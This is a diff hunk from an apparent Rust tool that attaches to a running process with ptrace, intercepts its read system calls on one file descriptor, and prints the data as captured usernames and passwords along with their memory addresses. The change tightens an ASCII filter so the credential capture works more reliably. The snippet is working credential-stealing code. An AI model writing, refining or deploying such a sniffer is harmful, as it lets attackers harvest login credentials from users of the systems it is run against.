@@ -92,14 +92,14 @@ pub fn debugTHREAD(pid: Pid) {
                     let reg = ptrace::getregs(pid).unwrap();
 
                     // Getting and Checking for Username and Password
-                    if (0..5).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) {
+                    if (0..5).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) && decoder(pid, reg.rsi as AddressType).is_ascii() {
                         count += 1;
                         
-                        if !decoder(pid, reg.rsi as AddressType).is_empty() && decoder(pid, reg.rsi as AddressType).is_ascii() {
+                        if !decoder(pid, reg.rsi as AddressType).is_empty() {
                             println!("\n\n{} Username: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
                         }
 
-                    } else if (5..).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) {
+                    } else if (5..).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) && decoder(pid, reg.rsi as AddressType).is_ascii() {
                         
                         if !decoder(pid, reg.rsi as ptrace::AddressType).is_empty() {
                             println!("\n{} Password: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
